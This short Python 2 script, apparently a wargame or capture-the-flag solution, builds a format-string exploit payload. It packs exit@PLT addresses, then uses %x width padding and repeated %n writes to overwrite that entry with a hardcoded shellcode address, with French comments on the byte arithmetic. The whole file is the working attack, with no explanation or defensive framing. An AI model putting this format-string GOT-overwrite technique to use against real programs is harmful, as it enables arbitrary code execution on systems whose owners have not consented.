import struct

EXIT_PLT = 0x80497e0
SHELLCODE = 0xffffde31

def pad(s):
        return s+"X"*(100-len(s))

exploit = ""
exploit += struct.pack("I", EXIT_PLT)
exploit += struct.pack("I", EXIT_PLT+2)
exploit += "BBBBCCCC"
exploit += "%4$56935x"           # 2 derniers byte de l'adresse de notre shellcode (en decimal) auquel on soustrait 25 (padding)
exploit += "%10$n "*10
exploit += "%8987006x"           # bidouiller jusqu'a obtenir 0xffff
exploit += "%11$n"*10

print pad(exploit)

